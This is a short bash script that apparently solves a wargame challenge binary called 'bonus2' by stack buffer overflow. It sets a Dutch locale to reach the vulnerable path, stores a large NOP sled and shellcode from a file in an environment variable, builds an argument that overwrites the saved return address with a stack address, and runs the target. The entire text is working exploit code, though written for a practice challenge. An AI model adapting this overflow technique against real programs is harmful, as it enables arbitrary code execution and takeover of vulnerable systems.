#!/bin/bash
export LANG="`echo -ne '\x6e\x6c'`"
export PAYLOAD="`python -c 'import sys; sys.stdout.write("\x90" * 90000)'``cat bin`"

TARGET_EIP="\x9f\xff\xff\xbf"
TOTAL_PAYLOAD="`cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin``cat bin`"


FIRST="`python -c 'import sys; sys.stdout.write("\x90" * 42);'`"
SECOND="`python -c 'import sys; sys.stdout.write("\xA0" * 3);'``python -c "import sys; sys.stdout.write(\\"$TARGET_EIP\\" * 8)"`$TOTAL_PAYLOAD`python -c 'import sys; sys.stdout.write("\xBA\xBA\xBA\xBA" * 123);'`"

echo '__hex_first='
echo "$FIRST" | hexdump -C
echo '__hex_second='
echo "$SECOND" | hexdump -C  

  ./bonus2 "$FIRST" "$SECOND"
